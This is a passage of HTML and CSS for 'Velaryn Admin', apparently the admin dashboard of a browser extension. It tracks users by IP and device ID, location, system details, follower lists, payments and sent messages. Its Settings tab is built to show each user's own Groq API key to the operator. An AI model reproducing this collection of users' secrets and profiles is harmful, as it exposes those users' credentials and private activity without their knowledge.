<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Velaryn Admin</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
  <style>
    /* ===== RESET & BASE ===== */
    *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
    body { font-family: 'Inter', -apple-system, sans-serif; background: #09090b; color: #fafafa; min-height: 100vh; }
    a { color: #a78bfa; text-decoration: none; }
    a:hover { text-decoration: underline; }
    code { background: rgba(255,255,255,0.06); padding: 2px 6px; border-radius: 4px; font-size: 13px; }
    button { cursor: pointer; font-family: inherit; }
    input, textarea { font-family: inherit; }

    /* ===== LOGIN ===== */
    #loginScreen {
      display: flex; align-items: center; justify-content: center; min-height: 100vh;
      background: linear-gradient(135deg, #09090b 0%, #18181b 100%);
    }
    .login-card {
      background: #18181b; border: 1px solid #27272a; border-radius: 16px;
      padding: 48px 40px; width: 100%; max-width: 400px; text-align: center;
    }
    .login-logo { font-size: 36px; margin-bottom: 8px; }
    .login-title { font-size: 22px; font-weight: 700; margin-bottom: 4px; }
    .login-sub { color: #71717a; font-size: 14px; margin-bottom: 28px; }
    .login-input {
      width: 100%; padding: 12px 16px; background: #27272a; border: 1px solid #3f3f46;
      border-radius: 10px; color: #fff; font-size: 15px; margin-bottom: 16px;
    }
    .login-input:focus { outline: none; border-color: #7c3aed; }
    .login-btn {
      width: 100%; padding: 12px; border: none; border-radius: 10px;
      background: #7c3aed; color: #fff; font-size: 15px; font-weight: 600;
      transition: background 0.2s;
    }
    .login-btn:hover { background: #6d28d9; }

    /* ===== DASHBOARD LAYOUT ===== */
    #dashboard { display: none; }
    #dashboard.active { display: flex; min-height: 100vh; }
    .sidebar {
      width: 240px; background: #18181b; border-right: 1px solid #27272a;
      display: flex; flex-direction: column; flex-shrink: 0; position: fixed;
      top: 0; left: 0; bottom: 0; z-index: 10;
    }
    .sidebar-brand {
      padding: 24px 20px 16px; font-size: 18px; font-weight: 700; display: flex;
      align-items: center; gap: 10px; border-bottom: 1px solid #27272a;
    }
    .sidebar-brand .dot { width: 10px; height: 10px; background: #7c3aed; border-radius: 50%; }
    .sidebar-nav { padding: 12px; flex: 1; }
    .nav-item {
      display: flex; align-items: center; gap: 10px; padding: 10px 14px;
      border-radius: 8px; color: #a1a1aa; font-size: 14px; font-weight: 500;
      cursor: pointer; transition: all 0.15s; margin-bottom: 2px; border: none; background: none; width: 100%;
    }
    .nav-item:hover { background: #27272a; color: #fafafa; }
    .nav-item.active { background: rgba(124,58,237,0.12); color: #a78bfa; }
    .nav-item .icon { font-size: 18px; }
    .sidebar-footer {
      padding: 16px 12px; border-top: 1px solid #27272a;
    }
    .logout-btn {
      display: flex; align-items: center; gap: 10px; padding: 10px 14px;
      border-radius: 8px; color: #71717a; font-size: 14px; cursor: pointer;
      transition: all 0.15s; border: none; background: none; width: 100%;
    }
    .logout-btn:hover { background: #27272a; color: #f87171; }
    .main-content {
      flex: 1; margin-left: 240px; padding: 28px 32px;
    }
    .page-header {
      display: flex; align-items: center; justify-content: space-between; margin-bottom: 24px;
    }
    .page-header h1 { font-size: 24px; font-weight: 700; }

    /* ===== STATS CARDS ===== */
    .stats-row {
      display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
      gap: 16px; margin-bottom: 28px;
    }
    .stat-card {
      background: #18181b; border: 1px solid #27272a; border-radius: 12px;
      padding: 20px; display: flex; flex-direction: column;
    }
    .stat-card .label { color: #71717a; font-size: 12px; font-weight: 500; text-transform: uppercase; letter-spacing: 0.5px; }
    .stat-card .value { font-size: 28px; font-weight: 700; margin-top: 4px; }
    .stat-card .value.purple { color: #a78bfa; }
    .stat-card .value.green { color: #34d399; }
    .stat-card .value.red { color: #f87171; }
    .stat-card .value.blue { color: #60a5fa; }

    /* ===== TABLE ===== */
    .table-card {
      background: #18181b; border: 1px solid #27272a; border-radius: 12px;
      overflow: hidden;
    }
    .table-header {
      display: flex; align-items: center; justify-content: space-between;
      padding: 16px 20px; border-bottom: 1px solid #27272a;
    }
    .table-header h3 { font-size: 16px; font-weight: 600; }
    .table-search {
      padding: 8px 14px; background: #27272a; border: 1px solid #3f3f46;
      border-radius: 8px; color: #fff; font-size: 13px; width: 220px;
    }
    .table-search:focus { outline: none; border-color: #7c3aed; }
    table { width: 100%; border-collapse: collapse; }
    th { text-align: left; padding: 12px 16px; font-size: 12px; font-weight: 600;
      color: #71717a; text-transform: uppercase; letter-spacing: 0.5px; border-bottom: 1px solid #27272a; }
    td { padding: 12px 16px; font-size: 14px; border-bottom: 1px solid rgba(39,39,42,0.5); }
    tr:hover { background: rgba(255,255,255,0.02); }
    tr.clickable { cursor: pointer; }
    .empty-state { text-align: center; padding: 40px !important; color: #52525b; }
    .empty-state .icon { font-size: 36px; margin-bottom: 8px; }
    .empty-state.small { padding: 20px !important; font-size: 13px; }

    /* User cell */
    .user-cell { display: flex; align-items: center; gap: 12px; }
    .user-avatar { width: 36px; height: 36px; border-radius: 10px; background: linear-gradient(135deg, #7c3aed, #6366f1);
      display: flex; align-items: center; justify-content: center; font-size: 13px; font-weight: 700; flex-shrink: 0; }
    .user-info .ip { font-weight: 600; font-size: 13px; font-family: monospace; }
    .user-info .note { color: #71717a; font-size: 12px; }
    .location-cell .country { display: block; font-weight: 500; }
    .location-cell .city { color: #71717a; font-size: 12px; }
    .system-cell .os { font-weight: 500; }
    .system-cell .browser { color: #71717a; font-size: 12px; }
    .stats-cell .main-stat { font-weight: 600; }
    .stats-cell .sub-stat { color: #71717a; font-size: 12px; }
    .time-ago { color: #71717a; font-size: 13px; }

    /* Badges */
    .badge { padding: 3px 10px; border-radius: 6px; font-size: 12px; font-weight: 600; }
    .badge.blocked { background: rgba(248,113,113,0.15); color: #f87171; }
    .online-indicator { display: flex; align-items: center; gap: 6px; font-size: 13px; }
    .online-indicator::before { content: ''; width: 8px; height: 8px; border-radius: 50%; }
    .online-indicator.online { color: #34d399; }
    .online-indicator.online::before { background: #34d399; box-shadow: 0 0 6px rgba(52,211,153,0.4); }
    .online-indicator.offline { color: #71717a; }
    .online-indicator.offline::before { background: #52525b; }

    /* Action buttons */
    .action-btn {
      padding: 5px 12px; border-radius: 6px; font-size: 12px; font-weight: 600;
      border: none; transition: all 0.15s;
    }
    .action-btn.edit { background: rgba(99,102,241,0.15); color: #818cf8; }
    .action-btn.edit:hover { background: rgba(99,102,241,0.25); }
    .action-btn.block { background: rgba(248,113,113,0.15); color: #f87171; }
    .action-btn.block:hover { background: rgba(248,113,113,0.25); }
    .action-btn.unblock { background: rgba(52,211,153,0.15); color: #34d399; }
    .action-btn.unblock:hover { background: rgba(52,211,153,0.25); }

    /* ===== KEY STYLES ===== */
    .key-code { font-size: 13px; color: #a78bfa; letter-spacing: 0.5px; }
    .copy-btn {
      background: none; border: none; padding: 2px 6px; font-size: 14px;
      cursor: pointer; opacity: 0.6; transition: opacity 0.15s;
    }
    .copy-btn:hover { opacity: 1; }
    .key-badge {
      padding: 3px 10px; border-radius: 6px; font-size: 12px; font-weight: 600;
    }
    .key-active { background: rgba(52,211,153,0.15); color: #34d399; }
    .key-unused { background: rgba(251,191,36,0.15); color: #fbbf24; }
    .key-revoked { background: rgba(248,113,113,0.15); color: #f87171; }
    .key-stats-row { display: flex; gap: 12px; margin-bottom: 20px; flex-wrap: wrap; }
    .key-stat {
      background: #27272a; padding: 10px 16px; border-radius: 10px;
      font-size: 13px; color: #a1a1aa;
    }
    .key-stat strong { color: #fafafa; font-weight: 700; display: block; font-size: 18px; margin-bottom: 2px; }
    .key-actions { display: flex; gap: 10px; flex-wrap: wrap; }
    .key-action-btn {
      padding: 10px 20px; border-radius: 10px; font-size: 14px; font-weight: 600;
      border: none; transition: all 0.15s;
    }
    .key-action-btn.primary { background: #7c3aed; color: #fff; }
    .key-action-btn.primary:hover { background: #6d28d9; }
    .key-action-btn.secondary { background: #27272a; color: #a1a1aa; }
    .key-action-btn.secondary:hover { background: #3f3f46; color: #fff; }

    /* ===== KEYS LAYOUT ===== */
    .keys-toolbar {
      display: flex; align-items: center; justify-content: space-between;
      margin-bottom: 20px; gap: 16px; flex-wrap: wrap;
    }
    .keys-toolbar-right { display: flex; gap: 10px; align-items: center; }
    .keys-filter-tabs { display: flex; gap: 2px; background: #18181b; border-radius: 10px; padding: 4px; border: 1px solid #27272a; }
    .keys-filter {
      padding: 7px 16px; border-radius: 8px; font-size: 13px; font-weight: 500;
      color: #71717a; cursor: pointer; border: none; background: none; transition: all 0.15s;
    }
    .keys-filter:hover { color: #a1a1aa; }
    .keys-filter.active { background: #7c3aed; color: #fff; }
    /* Users filter tabs */
    .users-filter-tabs { display: flex; gap: 2px; background: #18181b; border-radius: 10px; padding: 3px; border: 1px solid #27272a; }
    .users-filter-tabs .filter-tab {
      padding: 6px 14px; border-radius: 8px; font-size: 13px; font-weight: 500;
      color: #71717a; cursor: pointer; border: none; background: none; transition: all 0.15s;
      display: flex; align-items: center; gap: 6px;
    }
    .users-filter-tabs .filter-tab:hover { color: #a1a1aa; }
    .users-filter-tabs .filter-tab.active { background: #7c3aed; color: #fff; }
    .filter-count { font-size: 11px; opacity: 0.7; }
    .keys-layout { display: flex; gap: 20px; min-height: 500px; }
    .keys-user-list {
      width: 280px; flex-shrink: 0; background: #18181b; border: 1px solid #27272a;
      border-radius: 12px; overflow: hidden; display: flex; flex-direction: column;
    }
    .keys-user-list-header {
      padding: 14px 18px; border-bottom: 1px solid #27272a;
      display: flex; align-items: center; justify-content: space-between;
    }
    .keys-user-list-header h4 { font-size: 14px; font-weight: 600; }
    .keys-user-list-items { flex: 1; overflow-y: auto; max-height: 500px; }
    .keys-user-item {
      display: flex; align-items: center; gap: 10px; padding: 12px 16px;
      cursor: pointer; transition: background 0.1s; border-bottom: 1px solid rgba(39,39,42,0.5);
    }
    .keys-user-item:hover { background: rgba(255,255,255,0.03); }
    .keys-user-item.active { background: rgba(124,58,237,0.12); border-left: 3px solid #7c3aed; }
    .keys-user-item .avatar {
      width: 32px; height: 32px; border-radius: 8px;
      background: linear-gradient(135deg, #7c3aed, #6366f1);
      display: flex; align-items: center; justify-content: center;
      font-size: 11px; font-weight: 700; flex-shrink: 0;
    }
    .keys-user-item .info { flex: 1; min-width: 0; }
    .keys-user-item .ip { font-size: 12px; font-family: monospace; font-weight: 600; }
    .keys-user-item .meta { font-size: 11px; color: #71717a; }
    .keys-user-item .key-count {
      font-size: 11px; font-weight: 600; padding: 2px 8px; border-radius: 10px;
      background: rgba(124,58,237,0.15); color: #a78bfa;
    }
    .keys-panel { flex: 1; min-width: 0; }
    .keys-panel-empty {
      text-align: center; padding: 60px 20px; color: #52525b;
    }
    .keys-panel-empty .icon { font-size: 48px; margin-bottom: 12px; }
    .keys-user-detail-header {
      background: #18181b; border: 1px solid #27272a; border-radius: 12px;
      padding: 20px; margin-bottom: 16px; display: flex; align-items: center; gap: 16px;
    }
    .keys-user-detail-header .avatar {
      width: 44px; height: 44px; border-radius: 10px;
      background: linear-gradient(135deg, #7c3aed, #6366f1);
      display: flex; align-items: center; justify-content: center;
      font-size: 16px; font-weight: 700; flex-shrink: 0;
    }
    .keys-user-detail-header .info { flex: 1; }
    .keys-user-detail-header .ip { font-size: 16px; font-family: monospace; font-weight: 700; }
    .keys-user-detail-header .meta { font-size: 12px; color: #71717a; }
    .keys-user-detail-header .actions { display: flex; gap: 8px; }

    /* ===== PROFILE ===== */
    #userProfileSection { display: none; }
    .profile-header {
      display: flex; align-items: center; gap: 20px; margin-bottom: 24px;
      background: #18181b; border: 1px solid #27272a; border-radius: 14px; padding: 24px;
    }
    .profile-avatar {
      width: 56px; height: 56px; border-radius: 14px;
      background: linear-gradient(135deg, #7c3aed, #6366f1);
      display: flex; align-items: center; justify-content: center;
      font-size: 22px; font-weight: 700; flex-shrink: 0;
    }
    .profile-meta { flex: 1; }
    .profile-ip { font-size: 20px; font-weight: 700; font-family: monospace; }
    .profile-note-text { color: #71717a; font-size: 13px; }
    .profile-actions { display: flex; gap: 10px; }
    .profile-actions button {
      padding: 8px 16px; border-radius: 8px; font-size: 13px; font-weight: 500;
      border: 1px solid #3f3f46; background: #27272a; color: #a1a1aa;
      transition: all 0.15s;
    }
    .profile-actions button:hover { background: #3f3f46; color: #fafafa; }
    .profile-quick-stats { display: grid; grid-template-columns: repeat(4, 1fr); gap: 12px; margin-bottom: 24px; }
    .profile-stat {
      background: #18181b; border: 1px solid #27272a; border-radius: 10px;
      padding: 16px; text-align: center;
    }
    .profile-stat .val { font-size: 24px; font-weight: 700; color: #a78bfa; }
    .profile-stat .lbl { color: #71717a; font-size: 12px; margin-top: 2px; }

    /* Profile tabs */
    .profile-tabs-nav {
      display: flex; gap: 2px; margin-bottom: 20px; background: #18181b;
      border-radius: 10px; padding: 4px; border: 1px solid #27272a;
    }
    .profile-tab {
      padding: 8px 18px; border-radius: 8px; font-size: 13px; font-weight: 500;
      color: #71717a; cursor: pointer; transition: all 0.15s; border: none;
      background: none;
    }
    .profile-tab:hover { color: #a1a1aa; }
    .profile-tab.active { background: #7c3aed; color: #fff; }
    .profile-tab-content { display: none; }
    .profile-tab-content.active { display: block; }

    /* Profile Info grid */
    .info-grid {
      display: grid; grid-template-columns: 1fr 1fr; gap: 12px;
    }
    .info-item {
      background: #18181b; border: 1px solid #27272a; border-radius: 10px;
      padding: 14px 18px;
    }
    .info-item .label { color: #71717a; font-size: 12px; margin-bottom: 4px; }
    .info-item .value { font-size: 14px; font-weight: 500; }

    /* Invites */
    .invite-card {
      background: #18181b; border: 1px solid #27272a; border-radius: 10px;
      padding: 16px 18px; margin-bottom: 10px;
    }
    .invite-card h5 { font-size: 14px; margin-bottom: 6px; }
    .invite-card p { color: #a1a1aa; font-size: 13px; white-space: pre-wrap; word-break: break-word; }
    .invite-type {
      display: inline-block; font-size: 11px; font-weight: 600; padding: 2px 8px;
      border-radius: 4px; margin-bottom: 6px;
    }
    .invite-type.auto { background: rgba(96,165,250,0.15); color: #60a5fa; }
    .invite-type.personal { background: rgba(167,139,250,0.15); color: #a78bfa; }

    /* History */
    .history-item {
      display: flex; align-items: center; justify-content: space-between;
      padding: 12px 16px; border-bottom: 1px solid #27272a;
    }
    .history-item .target { font-weight: 500; }
    .history-item .time { color: #71717a; font-size: 12px; }

    /* Tracker extra sections */
    .tracker-extra-sections { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; margin-top: 20px; }
    .tracker-extra-card {
      background: #18181b; border: 1px solid #27272a; border-radius: 12px; overflow: hidden;
    }
    .tracker-extra-card.full-width { grid-column: 1 / -1; }
    .tracker-extra-card h4 { padding: 14px 18px; border-bottom: 1px solid #27272a; font-size: 14px; font-weight: 600; }
    .tracker-extra-card .content { padding: 14px 18px; max-height: 350px; overflow-y: auto; }

    /* Tracker items */
    .tracker-user { display: flex; align-items: center; gap: 10px; }
    .tracker-user-avatar { width: 30px; height: 30px; border-radius: 8px; background: #27272a;
      display: flex; align-items: center; justify-content: center; font-size: 11px; font-weight: 700; flex-shrink: 0; }
    .tracker-user-link { color: #a78bfa; font-weight: 500; }
    .tracker-amount { font-weight: 700; }
    .tracker-amount.whale { color: #fbbf24; }
    .tracker-amount.high { color: #34d399; }
    .tracker-rank { background: #27272a; padding: 2px 8px; border-radius: 6px; font-size: 12px; font-weight: 600; }
    .tracker-rank.top10 { background: rgba(251,191,36,0.15); color: #fbbf24; }
    .tracker-rank.top100 { background: rgba(167,139,250,0.15); color: #a78bfa; }
    .tracker-date { color: #71717a; font-size: 12px; }
    .tracker-note { color: #a1a1aa; font-size: 12px; max-width: 200px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
    .tracker-note-item { padding: 12px 0; border-bottom: 1px solid rgba(39,39,42,0.5); }
    .tracker-note-header { margin-bottom: 4px; }
    .tracker-note-user a { color: #a78bfa; font-weight: 500; font-size: 13px; }
    .tracker-note-text { color: #a1a1aa; font-size: 13px; }
    .tracker-tx-item { display: flex; align-items: center; gap: 12px; padding: 10px 0; border-bottom: 1px solid rgba(39,39,42,0.5); }
    .tracker-tx-avatar { font-size: 18px; }
    .tracker-tx-info { flex: 1; min-width: 0; }
    .tracker-tx-user a { color: #a78bfa; font-weight: 500; font-size: 13px; }
    .tracker-tx-details { color: #71717a; font-size: 12px; }
    .tracker-tx-amount { font-weight: 700; font-size: 14px; white-space: nowrap; }
    .tracker-tx-amount.whale { color: #fbbf24; }
    .tracker-tx-amount.high { color: #34d399; }
    .tracker-sent-message { padding: 12px 0; border-bottom: 1px solid rgba(39,39,42,0.5); }
    .tracker-sent-header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 6px; }
    .tracker-sent-to { display: flex; align-items: center; gap: 8px; }
    .tracker-sent-to-avatar { width: 24px; height: 24px; border-radius: 6px; background: #27272a;
      display: flex; align-items: center; justify-content: center; font-size: 10px; font-weight: 700; }
    .tracker-sent-to-name a { color: #a78bfa; font-weight: 500; font-size: 13px; }
    .tracker-sent-date { color: #71717a; font-size: 11px; }
    .tracker-sent-content { color: #d4d4d8; font-size: 13px; line-height: 1.5; background: rgba(0,0,0,0.2); padding: 8px 12px; border-radius: 8px; white-space: pre-wrap; word-break: break-word; }

    /* ===== MODAL ===== */
    #modalOverlay {
      display: none; position: fixed; inset: 0; z-index: 100;
      background: rgba(0,0,0,0.6); backdrop-filter: blur(4px);
      align-items: center; justify-content: center;
    }
    #modalOverlay.active { display: flex; }
    .modal-box {
      background: #18181b; border: 1px solid #27272a; border-radius: 16px;
      padding: 28px; width: 100%; max-width: 440px;
    }
    .modal-box h3 { font-size: 18px; font-weight: 700; margin-bottom: 20px; }
    .modal-field { margin-bottom: 16px; }
    .modal-field label { display: block; color: #71717a; font-size: 12px; margin-bottom: 6px; }
    .modal-field input, .modal-field textarea {
      width: 100%; padding: 10px 14px; background: #27272a; border: 1px solid #3f3f46;
      border-radius: 8px; color: #fff; font-size: 14px;
    }
    .modal-field textarea { min-height: 80px; resize: vertical; }
    .modal-actions { display: flex; gap: 10px; justify-content: flex-end; }
    .modal-btn {
      padding: 10px 20px; border-radius: 8px; font-size: 14px; font-weight: 500;
      border: none; transition: all 0.15s;
    }
    .modal-btn.cancel { background: #27272a; color: #a1a1aa; }
    .modal-btn.cancel:hover { background: #3f3f46; }
    .modal-btn.confirm { background: #7c3aed; color: #fff; }
    .modal-btn.confirm:hover { background: #6d28d9; }

    /* ===== TOAST ===== */
    #toastContainer { position: fixed; top: 20px; right: 20px; z-index: 200; display: flex; flex-direction: column; gap: 8px; }
    .toast {
      display: flex; align-items: center; gap: 8px; padding: 12px 18px;
      background: #18181b; border: 1px solid #27272a; border-radius: 10px;
      font-size: 14px; animation: toastIn 0.3s, toastOut 0.3s 2.7s;
    }
    .toast.error { border-color: rgba(248,113,113,0.3); }
    @keyframes toastIn { from { opacity: 0; transform: translateY(-10px); } to { opacity: 1; transform: translateY(0); } }
    @keyframes toastOut { to { opacity: 0; transform: translateY(-10px); } }

    /* ===== RESPONSIVE ===== */
    @media (max-width: 900px) {
      .sidebar { width: 60px; }
      .sidebar-brand span, .nav-item span:not(.icon), .sidebar-footer .logout-btn span:not(.icon) { display: none; }
      .sidebar-brand .dot { margin: 0 auto; }
      .nav-item, .logout-btn { justify-content: center; padding: 10px; }
      .main-content { margin-left: 60px; padding: 20px 16px; }
      .profile-quick-stats { grid-template-columns: repeat(2, 1fr); }
      .info-grid { grid-template-columns: 1fr; }
      .tracker-extra-sections { grid-template-columns: 1fr; }
      .keys-layout { flex-direction: column; }
      .keys-user-list { width: 100%; }
      .keys-user-list-items { max-height: 200px; }
      .keys-toolbar { flex-direction: column; align-items: stretch; }
      .keys-toolbar-right { flex-wrap: wrap; }
    }
  </style>
</head>
<body>

  <!-- LOGIN -->
  <div id="loginScreen">
    <div class="login-card">
      <div class="login-logo">‚ö°</div>
      <div class="login-title">Velaryn Admin</div>
      <div class="login-sub">Enter admin password</div>
      <input type="password" id="passwordInput" class="login-input" placeholder="Password">
      <button onclick="login()" class="login-btn">Log In</button>
    </div>
  </div>

  <!-- DASHBOARD -->
  <div id="dashboard">
    <!-- Sidebar -->
    <aside class="sidebar">
      <div class="sidebar-brand"><div class="dot"></div><span>Velaryn</span></div>
      <nav class="sidebar-nav">
        <button class="nav-item active" data-tab="users"><span class="icon">üë•</span><span>Users</span></button>
        <button class="nav-item" data-tab="blocked"><span class="icon">üîí</span><span>Blocked</span></button>
        <button class="nav-item" data-tab="keys"><span class="icon">üîë</span><span>Keys</span></button>
      </nav>
      <div class="sidebar-footer">
        <button class="logout-btn" onclick="logout()"><span class="icon">üö™</span><span>Log out</span></button>
      </div>
    </aside>

    <!-- Main -->
    <div class="main-content">
      <div class="page-header">
        <h1 id="pageTitle">Users</h1>
      </div>

      <!-- Stats -->
      <div class="stats-row">
        <div class="stat-card"><span class="label">Total Users</span><span class="value purple" id="totalUsers">0</span></div>
        <div class="stat-card"><span class="label">Online</span><span class="value green" id="onlineUsers">0</span></div>
        <div class="stat-card"><span class="label">Blocked</span><span class="value red" id="blockedUsers">0</span></div>
        <div class="stat-card"><span class="label">Total Messages</span><span class="value blue" id="totalMessages">0</span></div>
        <div class="stat-card"><span class="label">Keys</span><span class="value" id="statActiveKeys">0/0</span></div>
      </div>

      <!-- USERS SECTION -->
      <section id="usersSection">
        <div class="table-card">
          <div class="table-header">
            <div style="display:flex;align-items:center;gap:16px;flex-wrap:wrap;">
              <h3 id="usersTitle">All Users</h3>
              <div class="users-filter-tabs" id="usersFilterTabs">
                <button class="filter-tab active" data-filter="all">All <span class="filter-count" id="filterCountAll">0</span></button>
                <button class="filter-tab" data-filter="active">Active <span class="filter-count" id="filterCountActive">0</span></button>
                <button class="filter-tab" data-filter="inactive">Inactive <span class="filter-count" id="filterCountInactive">0</span></button>
              </div>
            </div>
            <input type="text" id="searchInput" class="table-search" placeholder="Search by IP, location, note...">
          </div>
          <table>
            <thead>
              <tr><th>User</th><th>Location</th><th>System</th><th>Stats</th><th>Status</th><th>Last Seen</th><th>Actions</th></tr>
            </thead>
            <tbody id="usersTableBody">
              <tr><td colspan="7" class="empty-state"><div class="icon">‚è≥</div><div>Loading...</div></td></tr>
            </tbody>
          </table>
        </div>
      </section>

      <!-- BLOCKED SECTION -->
      <section id="blockedSection" style="display: none;">
        <div class="table-card">
          <div class="table-header"><h3>Blocked Users</h3></div>
          <table>
            <thead><tr><th>IP</th><th>Reason</th><th>Blocked At</th><th>Actions</th></tr></thead>
            <tbody id="blockedTableBody"></tbody>
          </table>
        </div>
      </section>

      <!-- KEYS SECTION -->
      <section id="keysSection" style="display: none;">
        <!-- Key stats -->
        <div class="key-stats-row">
          <div class="key-stat"><strong id="keyStat-total">0</strong>Total</div>
          <div class="key-stat"><strong id="keyStat-active">0</strong>Active</div>
          <div class="key-stat"><strong id="keyStat-unused">0</strong>Unused</div>
          <div class="key-stat"><strong id="keyStat-revoked">0</strong>Revoked</div>
        </div>

        <!-- Filter tabs + global actions -->
        <div class="keys-toolbar">
          <div class="keys-filter-tabs">
            <button class="keys-filter active" data-filter="all">All</button>
            <button class="keys-filter" data-filter="active">Active</button>
            <button class="keys-filter" data-filter="unused">Unused</button>
            <button class="keys-filter" data-filter="revoked">Revoked</button>
            <button class="keys-filter" data-filter="unassigned">Unassigned</button>
          </div>
          <div class="keys-toolbar-right">
            <input type="text" id="keysSearch" class="table-search" placeholder="Search keys or users...">
            <button class="key-action-btn primary" data-action="generate-unassigned">+ Unassigned Key</button>
          </div>
        </div>

        <!-- Two-panel layout -->
        <div class="keys-layout">
          <!-- Left: User list -->
          <div class="keys-user-list">
            <div class="keys-user-list-header">
              <h4>Users</h4>
            </div>
            <div class="keys-user-list-items" id="keysUserList">
              <div class="empty-state small">Loading...</div>
            </div>
          </div>

          <!-- Right: Keys panel -->
          <div class="keys-panel">
            <div id="keysPanel">
              <div class="keys-panel-empty">
                <div class="icon">üîë</div>
                <div>Select a user to manage their keys, or view all keys above.</div>
              </div>
            </div>
            <!-- All keys table (shown when no user selected or "All" filter) -->
            <div id="keysAllTable">
              <div class="table-card">
                <div class="table-header"><h3>All Keys</h3></div>
                <div style="max-height:500px;overflow-y:auto;">
                <table>
                  <thead><tr><th>Key</th><th>Status</th><th>Owner / Bound</th><th>Device</th><th>Created</th><th>Actions</th></tr></thead>
                  <tbody id="keysTableBody"></tbody>
                </table>
                </div>
              </div>
            </div>
          </div>
        </div>
      </section>

      <!-- USER PROFILE -->
      <section id="userProfileSection">
        <div style="margin-bottom: 16px;">
          <button onclick="closeUserProfile()" style="background:none;border:none;color:#71717a;cursor:pointer;font-size:14px;">‚Üê Back to Users</button>
        </div>
        <div class="profile-header">
          <div class="profile-avatar" id="profileAvatar">??</div>
          <div class="profile-meta">
            <div class="profile-ip" id="profileIP">-</div>
            <div style="color:#71717a;font-size:12px;font-family:monospace;" id="profileDeviceId">-</div>
            <div class="profile-note-text" id="profileNote">No note</div>
            <div id="profileStatus" style="margin-top:4px;"></div>
          </div>
          <div class="profile-actions">
            <button onclick="refreshUserProfile()">üîÑ Refresh</button>
            <button onclick="exportUserData()">üì• Export</button>
          </div>
        </div>

        <div class="profile-quick-stats">
          <div class="profile-stat"><div class="val" id="profileMessages">0</div><div class="lbl">Messages</div></div>
          <div class="profile-stat"><div class="val" id="profileParses">0</div><div class="lbl">Parses</div></div>
          <div class="profile-stat"><div class="val" id="profileSessions">0</div><div class="lbl">Sessions</div></div>
          <div class="profile-stat"><div class="val" id="profileAIRequests">0</div><div class="lbl">AI Requests</div></div>
        </div>

        <div class="profile-tabs-nav">
          <button class="profile-tab active" data-tab="info">Info</button>
          <button class="profile-tab" data-tab="invites">Invites</button>
          <button class="profile-tab" data-tab="database">Database</button>
          <button class="profile-tab" data-tab="history">History</button>
          <button class="profile-tab" data-tab="settings">Settings</button>
          <button class="profile-tab" data-tab="tracker">Tracker</button>
        </div>

        <!-- TAB: Info -->
        <div class="profile-tab-content active" id="tabInfo">
          <div class="info-grid">
            <div class="info-item"><div class="label">OS</div><div class="value" id="infoOS">-</div></div>
            <div class="info-item"><div class="label">Browser</div><div class="value" id="infoBrowser">-</div></div>
            <div class="info-item"><div class="label">Language</div><div class="value" id="infoLanguage">-</div></div>
            <div class="info-item"><div class="label">Screen</div><div class="value" id="infoScreen">-</div></div>
            <div class="info-item"><div class="label">Timezone</div><div class="value" id="infoTimezone">-</div></div>
            <div class="info-item"><div class="label">Country</div><div class="value" id="infoCountry">-</div></div>
            <div class="info-item"><div class="label">City</div><div class="value" id="infoCity">-</div></div>
            <div class="info-item"><div class="label">First Seen</div><div class="value" id="infoFirstSeen">-</div></div>
            <div class="info-item"><div class="label">Last Activity</div><div class="value" id="infoLastActivity">-</div></div>
            <div class="info-item"><div class="label">Device ID</div><div class="value" id="infoDeviceId" style="font-family:monospace;font-size:12px;word-break:break-all;">-</div></div>
            <div class="info-item"><div class="label">Extension Version</div><div class="value" id="infoVersion">-</div></div>
          </div>
        </div>

        <!-- TAB: Invites -->
        <div class="profile-tab-content" id="tabInvites">
          <div id="invitesGrid"></div>
        </div>

        <!-- TAB: Database -->
        <div class="profile-tab-content" id="tabDatabase">
          <div class="table-card">
            <div class="table-header">
              <h3>Followers <span id="databaseCount" style="color:#71717a;font-weight:400;font-size:13px;">0</span></h3>
              <input type="text" id="databaseSearch" class="table-search" placeholder="Search followers...">
            </div>
            <div style="max-height:400px;overflow-y:auto;">
            <table>
              <thead><tr><th>#</th><th>Nickname</th><th>Status</th><th>Invited</th></tr></thead>
              <tbody id="databaseTableBody"></tbody>
            </table>
            </div>
          </div>
        </div>

        <!-- TAB: History -->
        <div class="profile-tab-content" id="tabHistory">
          <div class="table-card">
            <div class="table-header"><h3>Send History</h3></div>
            <div id="historyList" style="max-height:400px;overflow-y:auto;"></div>
          </div>
        </div>

        <!-- TAB: Settings -->
        <div class="profile-tab-content" id="tabSettings">
          <div class="info-grid">
            <div class="info-item"><div class="label">Groq API Key</div><div class="value" id="settingsGroqKey" style="word-break:break-all;font-family:monospace;font-size:13px;">-</div></div>
            <div class="info-item"><div class="label">Theme</div><div class="value" id="settingsTheme">-</div></div>
            <div class="info-item"><div class="label">Language</div><div class="value" id="settingsLanguage">-</div></div>
          </div>
        </div>

        <!-- TAB: Tracker -->
        <div class="profile-tab-content" id="tabTracker">
          <div class="stats-row" style="margin-bottom:16px;">
            <div class="stat-card"><span class="label">Total Spent</span><span class="value green" id="trackerTotalSpent">$0</span></div>
            <div class="stat-card"><span class="label">Transactions</span><span class="value blue" id="trackerTransactions">0</span></div>
            <div class="stat-card"><span class="label">Unique Users</span><span class="value purple" id="trackerUniqueUsers">0</span></div>
            <div class="stat-card"><span class="label">Notes</span><span class="value" id="trackerNotes">0</span></div>
          </div>
          <div class="table-card">
            <div class="table-header">
              <h3>Tracker Users</h3>
              <div style="display:flex;gap:10px;">
                <input type="text" id="trackerSearch" class="table-search" placeholder="Search...">
                <select id="trackerSort" style="padding:8px 12px;background:#27272a;border:1px solid #3f3f46;border-radius:8px;color:#fff;font-size:13px;">
                  <option value="spent">By Spent</option>
                  <option value="transactions">By Transactions</option>
                  <option value="rank">By Rank</option>
                  <option value="recent">By Recent</option>
                </select>
              </div>
            </div>
            <div style="max-height:400px;overflow-y:auto;">
            <table>
              <thead><tr><th>User</th><th>Total Spent</th><th>Txns</th><th>Rank</th><th>Last Payment</th><th>Note</th></tr></thead>
              <tbody id="trackerTableBody"></tbody>
            </table>
            </div>
          </div>
          <div class="tracker-extra-sections">
            <div class="tracker-extra-card"><h4>üìù User Notes</h4><div class="content" id="trackerNotesSection"></div></div>
